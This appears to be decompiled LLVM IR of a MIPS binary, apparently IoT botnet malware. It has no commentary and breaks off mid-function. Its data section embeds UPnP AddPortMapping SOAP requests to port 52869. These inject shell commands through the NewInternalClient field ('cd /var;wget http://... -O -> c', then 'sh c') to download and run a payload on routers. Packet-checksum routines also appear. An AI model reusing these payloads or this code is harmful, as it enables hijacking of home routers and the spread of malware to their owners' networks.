source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sysinfo = type { i32, [3 x i32], i32, i32, i32, i32, i32, i32, i16, i16, i32, i32, i32, [1 x i8] }
%sockaddr = type { i32, [14 x i8] }
%tms = type { i32, i32, i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timespec = type { i32, i32 }

@v0 = internal unnamed_addr global i32 0
@v1 = internal unnamed_addr global i32 0
@a0 = internal unnamed_addr global i32 0
@a1 = internal unnamed_addr global i32 0
@a2 = internal unnamed_addr global i32 0
@a3 = internal unnamed_addr global i32 0
@t1 = internal unnamed_addr global i32 0
@s0 = internal unnamed_addr global i32 0
@s1 = internal unnamed_addr global i32 0
@s2 = internal unnamed_addr global i32 0
@s3 = internal unnamed_addr global i32 0
@s4 = internal unnamed_addr global i32 0
@s5 = internal unnamed_addr global i32 0
@s6 = internal unnamed_addr global i32 0
@s7 = internal unnamed_addr global i32 0
@t9 = internal unnamed_addr global i32 0
@gp = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ra = internal unnamed_addr global i32 0
@global_var_4002bc.1 = global i32 268500991
@global_var_404464.3 = constant [3 x i8] c"$\09\00"
@global_var_449380.4 = global i32 4213296
@global_var_449454.5 = local_unnamed_addr global i32 4219968
@global_var_449348.6 = local_unnamed_addr global i32 4213488
@global_var_4493e4.7 = local_unnamed_addr global i32 4213584
@global_var_4492dc.8 = local_unnamed_addr global i32 4219728
@global_var_4491e8.9 = local_unnamed_addr global i32 4521984
@global_var_400514.10 = global i32 268500980
@global_var_449500.11 = local_unnamed_addr global i32 0
@global_var_449284.12 = local_unnamed_addr global i32 4218688
@global_var_4005f0.13 = global i32 -1883504624
@global_var_4493f0.14 = local_unnamed_addr global i32 4218496
@global_var_4006d0.15 = global i32 -1883504616
@global_var_400758.16 = global i32 -1883504616
@global_var_400000.17 = global i32 2135247942
@global_var_4491f0.18 = local_unnamed_addr global i32* @global_var_400000.17
@global_var_4007ec.19 = global i32 -1883504616
@global_var_44936c.20 = local_unnamed_addr global i32 4211288
@global_var_400808.21 = global i32 -1885208540
@global_var_449338.22 = local_unnamed_addr global i32 4195360
@global_var_400864.23 = global i32 -1883504616
@global_var_449458.24 = local_unnamed_addr global i32 4218000
@global_var_449504.25 = local_unnamed_addr global i32 0
@global_var_4492a8.26 = local_unnamed_addr global i32 4196608
@global_var_4493d8.27 = local_unnamed_addr global i32 4196504
@global_var_4009a4.28 = global i32 1008467973
@global_var_449354.29 = local_unnamed_addr global i32* @global_var_4009a4.28
@global_var_4492e4 = external local_unnamed_addr global i32
@global_var_4495b0.31 = global i32 0
@global_var_400a00.32 = global i32 -1883504624
@global_var_400a18.33 = global i32 -1883504624
@global_var_4492e8.34 = local_unnamed_addr global i32* @global_var_4495b0.31
@global_var_400a38.35 = global i32 -1883504624
@global_var_400a58.36 = global i32 -1883504624
@global_var_400a78.37 = global i32 -1883504624
@global_var_400a98.38 = global i32 136704
@global_var_449308 = external local_unnamed_addr global i32
@global_var_401364.40 = global i32 1008467973
@global_var_400acc.41 = global i32 -1883504624
@global_var_400ae8.42 = global i32 -1883504624
@global_var_400b08.43 = global i32 -1883504624
@global_var_400b2c.44 = global i32 -1883504624
@global_var_4492d0.45 = local_unnamed_addr global i32 4219088
@global_var_400b68.46 = global i32 -1843265516
@global_var_400b8c.47 = global i32 -1843199980
@global_var_44939c.48 = local_unnamed_addr global i32 4214176
@global_var_400bb4.49 = global i32 -1883504624
@global_var_400bf8.50 = global i32 -1883504624
@global_var_449300.51 = local_unnamed_addr global i32 4210664
@global_var_400c1c.52 = global i32 -1883504624
@global_var_449508.53 = global i32 0
@global_var_4492cc.54 = local_unnamed_addr global i32* @global_var_449508.53
@global_var_44950c.55 = global i32 0
@global_var_449394.56 = local_unnamed_addr global i32* @global_var_44950c.55
@global_var_4493a0.57 = local_unnamed_addr global i32 4217600
@global_var_4493a4.58 = local_unnamed_addr global i32 4198248
@global_var_449388.59 = local_unnamed_addr global i32 4198340
@global_var_408008.61 = global i32 1630013283
@global_var_408010.62 = global i32 910111588
@global_var_408024.63 = global i32 1902333813
@global_var_408030.64 = global i32 1918987364
@global_var_40803c.65 = global i32 1651077759
@global_var_40804c.66 = global i32 1852138848
@global_var_408058.67 = global i32 1213682516
@global_var_408068.68 = global i32 1902339189
@global_var_408074.69 = global i32 1886807650
@global_var_408080.70 = global i32 1701208932
@global_var_408098.71 = global i32 1701208932
@global_var_4080bc.72 = global i32 1832138359
@global_var_4080d4.73 = global i32 846015792
@global_var_4080e0.74 = global i32 1801603937
@global_var_4080ec.75 = global i32 1614177892
@global_var_408104.76 = global i32 912287078
@global_var_40811c.77 = constant [3 x i8] c"j)\00"
@global_var_408120.78 = global i32 1999136885
@global_var_408130.79 = global i32 694447733
@global_var_408140.80 = global i32 694251125
@global_var_408150.81 = global i32 1749755755
@global_var_4013d8.83 = global i32 -1883504624
@global_var_4013f0.84 = global i32 -1883504624
@global_var_401408.85 = global i32 -1883504624
@global_var_401420.86 = global i32 -1883504624
@global_var_40143c.87 = global i32 -1883504624
@global_var_401454.88 = global i32 604176386
@global_var_401494.89 = global i32 -1883504624
@global_var_4014ac.90 = global i32 -1883504624
@global_var_4014c4.91 = global i32 -1883504624
@global_var_4014dc.92 = global i32 -1883504624
@global_var_4014f4.93 = global i32 -1883504624
@global_var_40150c.94 = global i32 4231201
@global_var_401594.95 = global i32 -1883504624
@global_var_4015ac.96 = global i32 604241919
@global_var_401698.97 = constant [3 x i8] c"(B\00"
@global_var_4016b8.98 = global i32 -1883504624
@global_var_4016d8.99 = global i32 -1883504624
@global_var_4016f4.100 = global i32 -1883504624
@global_var_40170c.101 = global i32 -1883504624
@global_var_401728.102 = global i32 -1883504624
@global_var_401740.103 = global i32 -1883504624
@global_var_401758.104 = global i32 -1883504624
@global_var_401770.105 = global i32 -1883504624
@global_var_40178c.106 = global i32 -1883504624
@global_var_4017a4.107 = global i32 -1883504624
@global_var_4017ec.108 = global i32 -1883504624
@global_var_401804.109 = global i32 -1883504624
@global_var_40181c.110 = global i32 -1883504624
@global_var_401834.111 = global i32 -1883504624
@global_var_40184c.112 = global i32 -1883504624
@global_var_401864.113 = global i32 -1883504624
@global_var_40187c.114 = global i32 -1883504624
@global_var_401894.115 = global i32 604241919
@global_var_4018b4.116 = global i32 -1883504624
@global_var_4018cc.117 = global i32 -1883504624
@global_var_4018e4.118 = global i32 -1883504624
@global_var_4018fc.119 = global i32 -1883504624
@global_var_401914.120 = global i32 -1883504624
@global_var_40192c.121 = global i32 -1883504624
@global_var_401944.122 = global i32 -1883504624
@global_var_40195c.123 = global i32 -1883504624
@global_var_401978.124 = global i32 -1883504624
@global_var_401990.125 = global i32 -1883504624
@global_var_4019a8.126 = global i32 -1883504624
@global_var_4019c0.127 = global i32 -1883504624
@global_var_4019d8.128 = global i32 -1883504624
@global_var_4019f0.129 = global i32 -1883504624
@global_var_401a08.130 = global i32 -1883504624
@global_var_401a20.131 = global i32 -1883504624
@global_var_401a38.132 = global i32 -1883504624
@global_var_401a54.133 = global i32 -1883504624
@global_var_401a6c.134 = global i32 -1883504624
@global_var_401a84.135 = global i32 -1883504624
@global_var_401a9c.136 = global i32 -1883504624
@global_var_401ab8.137 = global i32 -1883504624
@global_var_401ad0.138 = global i32 -1883504624
@global_var_401aec.139 = global i32 -1883504624
@global_var_401b04.140 = global i32 -1883504624
@global_var_401b1c.141 = global i32 -1883504624
@global_var_401b5c.142 = global i32 -1883504624
@global_var_401b74.143 = global i32 -1883504624
@global_var_401b98.144 = global i32 -1883504624
@global_var_401bb0.145 = global i32 -1883504624
@global_var_401bc8.146 = global i32 -1883504624
@global_var_401be0.147 = global i32 -1883504624
@global_var_401bf8.148 = global i32 -1883504624
@global_var_401c10.149 = global i32 1971712
@global_var_44928c.150 = local_unnamed_addr global i32 4213200
@global_var_449028.151 = local_unnamed_addr global i32 -1
@global_var_449518.152 = local_unnamed_addr global i32 0
@global_var_401d14.154 = global i32 -1883504616
@global_var_401d4c.155 = global i32 -1883504616
@global_var_401d68.156 = global i32 -1883504616
@global_var_401d80.157 = global i32 1006796544
@global_var_401db8.158 = global i32 -1883504616
@global_var_401de0.159 = global i32 -1883504616
@global_var_401e3c.160 = constant [3 x i8] c"$B\00"
@global_var_401e5c.161 = global i32 -1883504616
@global_var_401e74.162 = global i32 -1883504616
@global_var_401e8c.163 = global i32 -1883504616
@global_var_401ea4.164 = global i32 -1883504616
@global_var_401ec0.165 = global i32 -1883504616
@global_var_449450.166 = local_unnamed_addr global i32 4214592
@global_var_4493a8.167 = local_unnamed_addr global i32 4205004
@global_var_449288.168 = local_unnamed_addr global i32 4198520
@global_var_4493c4.169 = local_unnamed_addr global i32 4211200
@global_var_449424.170 = local_unnamed_addr global i32 4211716
@global_var_4081e0.171 = global i32 1845493760
@global_var_449390.172 = local_unnamed_addr global i32 4214784
@global_var_449344.173 = local_unnamed_addr global i32 4213968
@global_var_44932c.174 = local_unnamed_addr global i32 4197496
@global_var_449480.175 = local_unnamed_addr global i32 4198156
@global_var_4493e8.176 = local_unnamed_addr global i32 4214880
@global_var_408248.177 = global i32 167772160
@global_var_449404.178 = local_unnamed_addr global i32 4197824
@global_var_4493c0.179 = local_unnamed_addr global i32 4213104
@0 = global i32 788529152
@global_var_44948c.181 = local_unnamed_addr global i32 4212456
@global_var_449490 = external local_unnamed_addr global i32
@global_var_449570.183 = global i32 0
@global_var_4492a0.184 = local_unnamed_addr global i32 4214496
@global_var_4492f8 = external global i32
@global_var_449360.187 = local_unnamed_addr global i32 4216096
@global_var_402280.188 = global i32 -1883504616
@global_var_449478.189 = local_unnamed_addr global i32 4211432
@global_var_449414.190 = local_unnamed_addr global i32 4204732
@global_var_44940c.191 = local_unnamed_addr global i32 4204824
@global_var_449468.192 = local_unnamed_addr global i32 4213840
@global_var_4492ec.193 = local_unnamed_addr global i32 4211332
@global_var_40824c.194 = constant [4 x i8] c"-sh\00"
@global_var_449428.195 = local_unnamed_addr global i32 4206940
@global_var_449024.196 = local_unnamed_addr global i32 -1
@global_var_4493fc.197 = local_unnamed_addr global i32 4196704
@global_var_4023f0.198 = global i32 -1883504616
@global_var_4493d4.199 = local_unnamed_addr global i32 4205180
@global_var_402458.200 = global i32 -1912302312
@global_var_449444.201 = local_unnamed_addr global i32 4217504
@global_var_4493cc.202 = local_unnamed_addr global i32 4216240
@global_var_449294.203 = local_unnamed_addr global i32 4212848
@global_var_4494a8.204 = local_unnamed_addr global i32 4216512
@global_var_4025f0.205 = global i32 -1883504616
@global_var_449420.206 = local_unnamed_addr global i32 4217152
@global_var_408250.207 = global i32 84019459
@global_var_449304.208 = local_unnamed_addr global i32 4216704
@global_var_408258.209 = global i32 16974341
@global_var_402758.210 = global i32 -1883504616
@global_var_4494ac.211 = local_unnamed_addr global i32 4216928
@global_var_40282c.212 = global i32 268500695
@global_var_402848.213 = global i32 -1883504616
@global_var_4494c0.214 = local_unnamed_addr global i32 4195876
@global_var_44951c.215 = local_unnamed_addr global i32 0
@global_var_449528.216 = local_unnamed_addr global i32 0
@global_var_449520.217 = local_unnamed_addr global i32 0
@global_var_449524.218 = local_unnamed_addr global i32 0
@global_var_449340.219 = local_unnamed_addr global i32 4214688
@global_var_449484.220 = local_unnamed_addr global i32 4213392
@global_var_4492b0.221 = local_unnamed_addr global i32 4215984
@global_var_449324.222 = local_unnamed_addr global i32 4212360
@global_var_402ca8.223 = global i32 -1883504616
@global_var_449440.224 = local_unnamed_addr global i32 4214368
@global_var_44944c.225 = local_unnamed_addr global i32 4217024
@global_var_402f4c.226 = global i32 -1883504616
@global_var_402f68.227 = global i32 -1883504616
@global_var_449530.228 = global i32 0
@global_var_44935c.229 = local_unnamed_addr global i32* @global_var_449530.228
@global_var_449368.230 = local_unnamed_addr global i32 4220748
@global_var_44956e.231 = local_unnamed_addr global i32 0
@global_var_44936e.232 = constant [3 x i8] c"BX\00"
@global_var_449376.233 = local_unnamed_addr global i32 1889534016
@global_var_44937e.234 = local_unnamed_addr global i32 -1798569920
@global_var_44937f.235 = local_unnamed_addr global i32 -872398774
@global_var_40303c.236 = global i32 -1883504624
@global_var_44937a.237 = local_unnamed_addr global i32 1224736836
@global_var_449580.238 = global i32 0
@global_var_449582.239 = local_unnamed_addr global i32 0
@global_var_4030ac.240 = global i32 -1883504624
@global_var_4030ec.242 = global i32 -1883504624
@global_var_403104.243 = global i32 -1883504624
@global_var_403120.244 = global i32 -1883504624
@global_var_449594.245 = local_unnamed_addr global i32 0
@global_var_403144.246 = global i32 -1883504624
@global_var_44952c.247 = global i32 0
@global_var_4494bc.248 = local_unnamed_addr global i32* @global_var_44952c.247
@global_var_4493bc.249 = local_unnamed_addr global i32 4217376
@global_var_4032f0.250 = global i32 -1885765284
@global_var_403300.251 = global i32 -1883504616
@global_var_403368.252 = global i32 -1816002299
@global_var_4494b0.253 = local_unnamed_addr global i32 4195024
@global_var_449314.254 = local_unnamed_addr global i32 4195112
@global_var_44938c.255 = local_unnamed_addr global i32 4217248
@global_var_4492e0.256 = local_unnamed_addr global i32 4215952
@global_var_4038e0.258 = global i32 -1883504616
@global_var_4038fc.259 = global i32 -1883504616
@global_var_403928.260 = global i32 -1883504616
@global_var_403944.261 = global i32 -1883504616
@global_var_403960.262 = global i32 -1883504616
@global_var_403a20.263 = global i32 -1883504616
@global_var_403ab8.264 = global i32 -1885208536
@global_var_408260.265 = constant [619 x i8] c"POST /wanipcn.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 590\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;>c\00"
@global_var_44945c.266 = local_unnamed_addr global i32 4211236
@global_var_4084cc.267 = constant [195 x i8] c"`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_408590.268 = constant [629 x i8] c"POST /wanipcn.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 623\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://\00"
@global_var_408808.269 = constant [11 x i8] c"/b -O -> c\00"
@global_var_403cbc.270 = global i32 -1883504616
@global_var_408814.271 = constant [621 x i8] c"POST /wanipcn.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 592\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;sh c\00"
@global_var_403e10.272 = global i32 -1883504616
@global_var_403e74.273 = global i32 -1883504616
@global_var_403ea4.274 = global i32 -1883504616
@global_var_403ec0.275 = global i32 -1883504616
@global_var_403eec.276 = global i32 -1883504616
@global_var_403f08.277 = global i32 -1883504616
@global_var_403f50.278 = global i32 -1883504616
@global_var_449534.279 = global i32 0
@global_var_44941c.280 = local_unnamed_addr global i32* @global_var_449534.279
@global_var_40401c.281 = global i32 -1883504616
@global_var_404054.282 = global i32 -1883504616
@global_var_4040d4.283 = global i32 -1883504616
@global_var_4040f8.284 = global i32 1006881996
@global_var_40412c.285 = global i32 268500937
@global_var_449408.286 = local_unnamed_addr global i32 4216320
@global_var_40416c.287 = global i32 -1883504616
@global_var_44930c.288 = local_unnamed_addr global i32* @global_var_401364.40
@global_var_404184.289 = global i32 -1883504616
@global_var_4493b8.290 = local_unnamed_addr global i32 4206500
@global_var_40419c.291 = global i32 -1883504616
@global_var_4492b8.292 = local_unnamed_addr global i32 4210632
@global_var_4041b4.293 = global i32 -1883504616
@global_var_4041d0.294 = global i32 -1883504616
@global_var_4041e8.295 = global i32 -1883307828
@global_var_449280.296 = local_unnamed_addr global i32 4216608
@global_var_449378.297 = local_unnamed_addr global i32 4212992
@global_var_4491f4.298 = local_unnamed_addr global i32 4213680
@global_var_404ca4.299 = global i32 -1881407472
@global_var_4493ec.300 = local_unnamed_addr global i32 4220740
@global_var_405140.301 = global i32 -1883504624
@global_var_4494a0.302 = local_unnamed_addr global i32 4220740
@global_var_44943c.303 = local_unnamed_addr global i32 4220748
@global_var_4491f8.304 = local_unnamed_addr global i32 4213200
@global_var_4492f0.305 = local_unnamed_addr global i32 4222320
@global_var_4491fc.306 = local_unnamed_addr global i32 4212848
@global_var_449460.307 = local_unnamed_addr global i32 4220740
@global_var_449498.308 = local_unnamed_addr global i32 4222464
@global_var_449590.309 = global i32 0
@global_var_4492ac.310 = local_unnamed_addr global i32* @global_var_449590.309
@global_var_4493b4.311 = local_unnamed_addr global i32 4224096
@global_var_4492c4.312 = local_unnamed_addr global i32 4225904
@global_var_449400.313 = local_unnamed_addr global i32 4217896
@global_var_449364.314 = local_unnamed_addr global i32 4217856
@global_var_4495c0.315 = global i32 0
@global_var_449200.316 = local_unnamed_addr global i32* @global_var_4495c0.315
@global_var_4494b4.317 = local_unnamed_addr global i32 4221904
@global_var_449540.318 = global i32 0
@global_var_449448.319 = local_unnamed_addr global i32* @global_var_449540.318
@global_var_449158.320 = global i32 256
@global_var_449170.321 = global i32* @global_var_449158.320
@global_var_449430.322 = local_unnamed_addr global i32** @global_var_449170.321
@global_var_449578.323 = global i32 0
@global_var_4492f4.324 = local_unnamed_addr global i32* @global_var_449578.323
@global_var_4492f9.325 = global i32 1150601216
@global_var_449640.326 = global i32 0
@global_var_449318.327 = local_unnamed_addr global i32* @global_var_449640.326
@global_var_449488.328 = local_unnamed_addr global i32 4223792
@global_var_449470.329 = local_unnamed_addr global i32 4219352
@global_var_405e58.330 = global i32 604176396
@global_var_405ef4.331 = global i32 -1883504624
@global_var_449204.332 = local_unnamed_addr global i32 4216096
@global_var_406084.333 = global i32 -1883504624
@global_var_406284.334 = global i32 268435483
@global_var_4062cc.335 = global i32 -1883504624
@global_var_4062f4.336 = global i32 -1883504624
@global_var_406324.337 = global i32 -1883504624
@global_var_4063cc.341 = global i32 -1883504624
@global_var_4494a4.342 = local_unnamed_addr global i32 4220544
@global_var_449310.343 = local_unnamed_addr global i32 0
@global_var_449330.344 = local_unnamed_addr global i32 4222240
@global_var_4064a8.345 = global i32 -1883504624
@global_var_4493d0.346 = local_unnamed_addr global i32 4223936
@global_var_4064c8.347 = global i32 -1883504624
@global_var_4064e4.348 = global i32 -1883504624
@global_var_40651c.349 = global i32 -1883504624
@global_var_406538.350 = global i32 -1883504624
@global_var_406554.351 = global i32 -1883504624
@global_var_406574.352 = global i32 -1883504624
@global_var_4493f8.353 = local_unnamed_addr global i32 4223696
@global_var_4065a4.354 = global i32 -1883504624
@global_var_4065bc.355 = global i32 -1883504624
@global_var_4065dc.356 = global i32 -1883504624
@global_var_4065fc.357 = global i32 -1883504624
@global_var_406624.358 = global i32 -1883504624
@global_var_44920c = external local_unnamed_addr global i32
@global_var_4066c4.359 = global i32 -1883504624
@global_var_406704.360 = global i32 -1883504624
@global_var_449214.361 = local_unnamed_addr global i32* @global_var_449580.238
@global_var_408a84.362 = constant [10 x i8] c"/dev/null\00"
@global_var_449334.363 = local_unnamed_addr global i32 4226160
@global_var_449584.364 = local_unnamed_addr global i32 0
@global_var_4493ac.365 = local_unnamed_addr global i32 0
@global_var_4492d8.366 = local_unnamed_addr global i32 0
@global_var_449494.367 = local_unnamed_addr global i32* @global_var_449570.183
@global_var_449574.368 = global i32 0
@global_var_44942c.369 = local_unnamed_addr global i32* @global_var_449574.368
@global_var_449398.370 = local_unnamed_addr global i32 4224768
@global_var_4492c8.371 = local_unnamed_addr global i32 4226592
@global_var_449218.372 = local_unnamed_addr global i32 4220892
@global_var_4492b4.373 = local_unnamed_addr global i32 4223424
@global_var_4492d4.374 = local_unnamed_addr global i32 4223232
@global_var_449418.375 = local_unnamed_addr global i32 4223328
@global_var_449374.376 = local_unnamed_addr global i32 4223136
@global_var_406a68.377 = global i32 604241921
@global_var_406a78.378 = global i32 906297346
@global_var_406a88.379 = global i32 -1883504624
@global_var_406adc.380 = global i32 -1883504624
@global_var_406afc.381 = global i32 -1883504624
@global_var_406b38.382 = global i32 -1883504624
@global_var_449328.383 = local_unnamed_addr global i32 0
@global_var_406bb0.384 = global i32 -1883504624
@global_var_449220.385 = local_unnamed_addr global i32 4219728
@global_var_406c20.386 = global i32 -1912405880
@global_var_449350.387 = local_unnamed_addr global i32 4222144
@global_var_406c5c.388 = global i32 -1883504624
@global_var_406c88.389 = global i32 -1885142960
@global_var_406db8.390 = global i32 -1883504624
@global_var_44934c.391 = local_unnamed_addr global i32 4224480
@global_var_406de0.392 = global i32 -1883504624
@global_var_4492c0.393 = local_unnamed_addr global i32 4222672
@global_var_406e74.394 = global i32 -1883504624
@global_var_4493b0.395 = local_unnamed_addr global i32 4225088
@global_var_406fb8.396 = global i32 -1881407464
@global_var_407030.397 = global i32 -1778253808
@global_var_4493e0.398 = local_unnamed_addr global i32 4226640
@global_var_407398.399 = global i32 -1883504624
@global_var_408a90.400 = global i32 -301124
@global_var_408bb0.401 = global i32 33554944
@global_var_4491d4.402 = global i32* @global_var_408bb0.401
@global_var_4494b8.403 = local_unnamed_addr global i32** @global_var_4491d4.402
@global_var_4491b0.404 = global i32 0
@global_var_4495a0.405 = local_unnamed_addr global i32 0
@global_var_4492a4.406 = local_unnamed_addr global i32 4226752
@global_var_407d90.407 = global i32 -1883504624
@global_var_407e10.408 = global i32 16711693
@global_var_4494cc.409 = global i32 0
@global_var_44937c.410 = local_unnamed_addr global i32* @global_var_4494cc.409
@global_var_449224.411 = local_unnamed_addr global i32 4213392
@global_var_449228.412 = local_unnamed_addr global i32 4213584
@global_var_407f58.413 = global i32 -1910964224
@global_var_407fc4.414 = global i32 -1883504624
@global_var_449514.153 = local_unnamed_addr global i8 0
@global_var_449384.241 = local_unnamed_addr global i16 64
@global_var_408168.180 = global [2 x i8] c"/\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %v1_400274 = load i32, i32* @ra, align 4
  %v1_4002ac = add i32 %v1_400274, 299268
  %v2_4002ac = inttoptr i32 %v1_4002ac to i32*
  %v3_4002ac = load i32, i32* %v2_4002ac, align 4
  call void @__pseudo_call(i32 %v3_4002ac)
  %v0_4002cc = load i32, i32* @v0, align 4
  ret i32 %v0_4002cc
}

define i32 @function_4002d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4002d0:
  %v0_4002d8.pre = load i32, i32* @a0, align 4
  %v0_4002dc.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_4002d8

dec_label_pc_4002d8:                              ; preds = %dec_label_pc_4002d8, %dec_label_pc_4002d0
  %v0_4002e4 = phi i32 [ %v2_4002e4, %dec_label_pc_4002d8 ], [ 0, %dec_label_pc_4002d0 ]
  %v0_4002dc = phi i32 [ %v1_4002dc, %dec_label_pc_4002d8 ], [ %v0_4002dc.pre, %dec_label_pc_4002d0 ]
  %v0_4002e0 = phi i32 [ %v1_4002e0, %dec_label_pc_4002d8 ], [ %v0_4002d8.pre, %dec_label_pc_4002d0 ]
  %v1_4002d8 = inttoptr i32 %v0_4002e0 to i16*
  %v2_4002d8 = load i16, i16* %v1_4002d8, align 2
  %v3_4002d8 = zext i16 %v2_4002d8 to i32
  %v1_4002dc = add i32 %v0_4002dc, -2
  %v1_4002e0 = add i32 %v0_4002e0, 2
  %v2_4002e4 = add i32 %v3_4002d8, %v0_4002e4
  %v1_4002e8 = icmp ult i32 %v1_4002dc, 2
  %v1_4002ec = icmp eq i1 %v1_4002e8, false
  br i1 %v1_4002ec, label %dec_label_pc_4002d8, label %dec_label_pc_4002f0

dec_label_pc_4002f0:                              ; preds = %dec_label_pc_4002d8
  %v2_4002f4 = icmp eq i32 %v1_4002dc, 1
  br i1 %v2_4002f4, label %dec_label_pc_4002f8, label %dec_label_pc_40030c

dec_label_pc_4002f8:                              ; preds = %dec_label_pc_4002f0
  %v1_4002fc = add i32 %v0_4002e0, 3
  %v2_4002fc = inttoptr i32 %v1_4002fc to i8*
  %v3_4002fc = load i8, i8* %v2_4002fc, align 1
  %v4_4002fc = sext i8 %v3_4002fc to i32
  %v2_400304 = add i32 %v4_4002fc, %v2_4002e4
  br label %dec_label_pc_40030c

dec_label_pc_40030c:                              ; preds = %dec_label_pc_4002f0, %dec_label_pc_4002f8
  %v0_40030c = phi i32 [ %v2_4002e4, %dec_label_pc_4002f0 ], [ %v2_400304, %dec_label_pc_4002f8 ]
  %v1_400310.in = phi i32 [ %v2_4002e4, %dec_label_pc_4002f0 ], [ %v2_400304, %dec_label_pc_4002f8 ]
  %v1_400310 = urem i32 %v1_400310.in, 65536
  %v1_40030c = udiv i32 %v0_40030c, 65536
  %v2_400310 = add nuw nsw i32 %v1_40030c, %v1_400310
  %v1_400314 = udiv i32 %v2_400310, 65536
  %v2_400318 = add nuw nsw i32 %v1_400314, %v2_400310
  %v1_40031c = urem i32 %v2_400318, 65536
  %v2_400320 = xor i32 %v1_40031c, 65535
  ret i32 %v2_400320

; uselistorder directives
  uselistorder i32 %v2_400310, { 1, 0 }
  uselistorder i32 %v2_4002e4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_40030c, { 1, 0 }
}

define i32 @function_400328(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_400328:
  %v1_40032c = add i32 %arg1, 16
  %v2_40032c = inttoptr i32 %v1_40032c to i32*
  %v3_40032c = load i32, i32* %v2_40032c, align 4
  %v0_400340.pre = load i32, i32* @a1, align 4
  %v0_400344.pre = load i32, i32* @a3, align 4
  br label %dec_label_pc_400340

dec_label_pc_400340:                              ; preds = %dec_label_pc_400340, %dec_label_pc_400328
  %v0_40034c = phi i32 [ %v2_40034c, %dec_label_pc_400340 ], [ 0, %dec_label_pc_400328 ]
  %v0_400344 = phi i32 [ %v1_400344, %dec_label_pc_400340 ], [ %v0_400344.pre, %dec_label_pc_400328 ]
  %v0_400348 = phi i32 [ %v1_400348, %dec_label_pc_400340 ], [ %v0_400340.pre, %dec_label_pc_400328 ]
  %v1_400340 = inttoptr i32 %v0_400348 to i16*
  %v2_400340 = load i16, i16* %v1_400340, align 2
  %v3_400340 = zext i16 %v2_400340 to i32
  %v1_400344 = add i32 %v0_400344, -2
  %v1_400348 = add i32 %v0_400348, 2
  %v2_40034c = add i32 %v3_400340, %v0_40034c
  %v1_400350 = icmp slt i32 %v1_400344, 2
  %v1_400354 = icmp eq i1 %v1_400350, false
  br i1 %v1_400354, label %dec_label_pc_400340, label %dec_label_pc_400358

dec_label_pc_400358:                              ; preds = %dec_label_pc_400340
  %v2_40035c = icmp eq i32 %v1_400344, 1
  br i1 %v2_40035c, label %dec_label_pc_400360, label %dec_label_pc_400370

dec_label_pc_400360:                              ; preds = %dec_label_pc_400358
  %v1_400364 = inttoptr i32 %v1_400348 to i8*
  %v2_400364 = load i8, i8* %v1_400364, align 1
  %v3_400364 = zext i8 %v2_400364 to i32
  %v2_40036c = add i32 %v3_400364, %v2_40034c
  br label %dec_label_pc_400370

dec_label_pc_400370:                              ; preds = %dec_label_pc_400358, %dec_label_pc_400360
  %v0_400384 = phi i32 [ %v2_40034c, %dec_label_pc_400358 ], [ %v2_40036c, %dec_label_pc_400360 ]
  %v1_400378 = urem i32 %v3_40032c, 65536
  %v1_40037c = add i32 %arg1, 9
  %v2_40037c = inttoptr i32 %v1_40037c to i8*
  %v3_40037c = load i8, i8* %v2_40037c, align 1
  %v4_40037c = zext i8 %v3_40037c to i32
  %v1_400380 = udiv i32 %v3_40032c, 65536
  %v2_400384 = add i32 %v0_400384, %v1_400380
